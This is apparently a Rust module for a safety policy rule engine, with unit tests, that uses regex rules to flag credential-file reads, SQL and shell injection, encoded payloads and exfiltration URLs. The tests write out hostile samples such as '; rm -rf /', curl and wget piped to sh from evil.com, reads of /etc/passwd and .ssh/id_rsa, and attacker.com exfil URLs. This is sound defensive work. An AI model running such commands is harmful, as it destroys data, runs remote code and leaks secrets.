//! Safety policy rule engine.
//!
//! Evaluates text content against a set of compiled regex-based rules
//! to detect policy violations such as system file access, SQL injection,
//! shell injection, and data exfiltration attempts.

use regex::Regex;

use super::{PolicyAction, Severity};

/// A compiled policy rule.
pub struct PolicyRule {
    /// Human-readable rule name.
    pub name: String,
    /// Compiled regex pattern for matching.
    pattern: Regex,
    /// Severity of the violation.
    pub severity: Severity,
    /// Action to take on match.
    pub action: PolicyAction,
}

/// A detected policy violation.
#[derive(Debug, Clone)]
pub struct PolicyMatch {
    /// Name of the rule that matched.
    pub rule: String,
    /// Severity of the violation.
    pub severity: Severity,
    /// Recommended action.
    pub action: PolicyAction,
}

/// Safety policy engine that checks text against configurable rules.
pub struct SafetyPolicy {
    rules: Vec<PolicyRule>,
}

impl SafetyPolicy {
    /// Create a new policy engine with the given rules.
    pub fn new(rules: Vec<PolicyRule>) -> Self {
        Self { rules }
    }

    /// Create a policy rule from components. Panics if the regex is invalid.
    pub fn rule(
        name: impl Into<String>,
        pattern: &str,
        severity: Severity,
        action: PolicyAction,
    ) -> PolicyRule {
        PolicyRule {
            name: name.into(),
            pattern: Regex::new(pattern)
                .unwrap_or_else(|e| panic!("Invalid regex for rule: {}", e)),
            severity,
            action,
        }
    }

    /// Check text against all policy rules. Returns all violations.
    pub fn check(&self, text: &str) -> Vec<PolicyMatch> {
        let mut matches = Vec::new();

        for rule in &self.rules {
            if rule.pattern.is_match(text) {
                matches.push(PolicyMatch {
                    rule: rule.name.clone(),
                    severity: rule.severity,
                    action: rule.action,
                });
            }
        }

        matches
    }
}

impl Default for SafetyPolicy {
    fn default() -> Self {
        let rules = vec![
            // 1. System file access attempts
            Self::rule(
                "system_file_access",
                r"/etc/(?:passwd|shadow)|\.ssh/|\.aws/credentials|\.gnupg/",
                Severity::High,
                PolicyAction::Block,
            ),
            // 2. SQL injection patterns
            Self::rule(
                "sql_injection",
                r"(?i)(?:DROP|ALTER)\s+TABLE|DELETE\s+FROM\s+\w+\s*;|INSERT\s+INTO|UPDATE\s+\w+\s+SET",
                Severity::High,
                PolicyAction::Block,
            ),
            // 3. Shell injection patterns
            Self::rule(
                "shell_injection",
                r";\s*(?:rm\s+-rf|curl.*\|\s*(?:sh|bash)|wget.*\|\s*(?:sh|bash))",
                Severity::Critical,
                PolicyAction::Block,
            ),
            // 4. Encoded exploit attempts
            Self::rule(
                "encoded_exploit",
                r"(?:base64_decode|eval\s*\(\s*base64|atob\s*\()",
                Severity::High,
                PolicyAction::Block,
            ),
            // 5. Obfuscated strings (>500 chars without spaces)
            Self::rule(
                "obfuscated_string",
                r"\S{500,}",
                Severity::Medium,
                PolicyAction::Review,
            ),
            // 6. Crypto private key patterns
            Self::rule(
                "crypto_private_key",
                r"(?i)(?:private\s+key|seed\s+phrase)\s*[:=]\s*[a-fA-F0-9]{64}",
                Severity::Critical,
                PolicyAction::Block,
            ),
            // 7. Excessive URLs (10+ URLs in content)
            Self::rule(
                "excessive_urls",
                // Match if there are 10+ http(s) URLs. Uses a regex that matches
                // text containing at least 10 URL-like patterns.
                r"(?s)(?:https?://[^\s]+[\s\S]*?){10,}https?://[^\s]+",
                Severity::Medium,
                PolicyAction::Review,
            ),
            // 8. Data exfiltration URLs
            Self::rule(
                "data_exfil_url",
                r"(?i)https?://[^/]+/(?:upload|exfil|steal|dump|leak)",
                Severity::High,
                PolicyAction::Block,
            ),
        ];

        Self::new(rules)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_system_file_access() {
        let policy = SafetyPolicy::default();

        let matches = policy.check("cat /etc/passwd");
        assert!(matches.iter().any(|m| m.rule == "system_file_access"));

        let matches = policy.check("read .ssh/id_rsa");
        assert!(matches.iter().any(|m| m.rule == "system_file_access"));

        let matches = policy.check("~/.aws/credentials");
        assert!(matches.iter().any(|m| m.rule == "system_file_access"));

        let matches = policy.check("~/.gnupg/private-keys");
        assert!(matches.iter().any(|m| m.rule == "system_file_access"));
    }

    #[test]
    fn test_sql_injection() {
        let policy = SafetyPolicy::default();

        let matches = policy.check("DROP TABLE users");
        assert!(matches.iter().any(|m| m.rule == "sql_injection"));

        let matches = policy.check("DELETE FROM users ;");
        assert!(matches.iter().any(|m| m.rule == "sql_injection"));

        let matches = policy.check("INSERT INTO accounts VALUES");
        assert!(matches.iter().any(|m| m.rule == "sql_injection"));

        let matches = policy.check("UPDATE users SET admin=true");
        assert!(matches.iter().any(|m| m.rule == "sql_injection"));
    }

    #[test]
    fn test_shell_injection() {
        let policy = SafetyPolicy::default();

        let matches = policy.check("; rm -rf /");
        assert!(matches.iter().any(|m| m.rule == "shell_injection"));

        let matches = policy.check("; curl http://evil.com | sh");
        assert!(matches.iter().any(|m| m.rule == "shell_injection"));

        let matches = policy.check("; wget http://evil.com | bash");
        assert!(matches.iter().any(|m| m.rule == "shell_injection"));
    }

    #[test]
    fn test_encoded_exploit() {
        let policy = SafetyPolicy::default();

        let matches = policy.check("base64_decode(payload)");
        assert!(matches.iter().any(|m| m.rule == "encoded_exploit"));

        let matches = policy.check("eval ( base64 encoded)");
        assert!(matches.iter().any(|m| m.rule == "encoded_exploit"));

        let matches = policy.check("atob('encoded')");
        assert!(matches.iter().any(|m| m.rule == "encoded_exploit"));
    }

    #[test]
    fn test_obfuscated_string() {
        let policy = SafetyPolicy::default();

        // 501 contiguous non-space chars
        let obfuscated = "a".repeat(501);
        let matches = policy.check(&obfuscated);
        assert!(matches.iter().any(|m| m.rule == "obfuscated_string"));

        // Normal text should not trigger
        let normal = "Hello world, this is a normal sentence.";
        let matches = policy.check(normal);
        assert!(!matches.iter().any(|m| m.rule == "obfuscated_string"));
    }

    #[test]
    fn test_crypto_private_key() {
        let policy = SafetyPolicy::default();

        let hex_key = "a".repeat(64);
        let text = format!("private key: {}", hex_key);
        let matches = policy.check(&text);
        assert!(matches.iter().any(|m| m.rule == "crypto_private_key"));

        let text = format!("seed phrase = {}", hex_key);
        let matches = policy.check(&text);
        assert!(matches.iter().any(|m| m.rule == "crypto_private_key"));
    }

    #[test]
    fn test_excessive_urls() {
        let policy = SafetyPolicy::default();

        // Build text with 11 URLs
        let urls: Vec<String> = (0..11)
            .map(|i| format!("https://example{}.com/path", i))
            .collect();
        let text = urls.join(" visit ");
        let matches = policy.check(&text);
        assert!(
            matches.iter().any(|m| m.rule == "excessive_urls"),
            "Should detect excessive URLs in: {}",
            text
        );
    }

    #[test]
    fn test_data_exfil_url() {
        let policy = SafetyPolicy::default();

        let matches = policy.check("https://evil.com/exfil?data=secret");
        assert!(matches.iter().any(|m| m.rule == "data_exfil_url"));

        let matches = policy.check("http://bad.com/steal/data");
        assert!(matches.iter().any(|m| m.rule == "data_exfil_url"));

        let matches = policy.check("https://attacker.com/dump");
        assert!(matches.iter().any(|m| m.rule == "data_exfil_url"));

        let matches = policy.check("https://attacker.com/leak");
        assert!(matches.iter().any(|m| m.rule == "data_exfil_url"));
    }

    #[test]
    fn test_clean_input_no_violations() {
        let policy = SafetyPolicy::default();
        let matches = policy.check("Hello, how are you doing today?");
        assert!(matches.is_empty());
    }

    #[test]
    fn test_policy_action_types() {
        let policy = SafetyPolicy::default();

        // Shell injection should be Block
        let matches = policy.check("; rm -rf /");
        assert!(matches.iter().any(|m| m.action == PolicyAction::Block));

        // Obfuscated string should be Review
        let obfuscated = "a".repeat(501);
        let matches = policy.check(&obfuscated);
        assert!(matches.iter().any(|m| m.action == PolicyAction::Review));
    }

    #[test]
    fn test_custom_policy() {
        let rules = vec![SafetyPolicy::rule(
            "custom_rule",
            r"forbidden_word",
            Severity::Low,
            PolicyAction::Warn,
        )];
        let policy = SafetyPolicy::new(rules);

        let matches = policy.check("This contains forbidden_word here");
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].rule, "custom_rule");
        assert_eq!(matches[0].severity, Severity::Low);
        assert_eq!(matches[0].action, PolicyAction::Warn);
    }
}
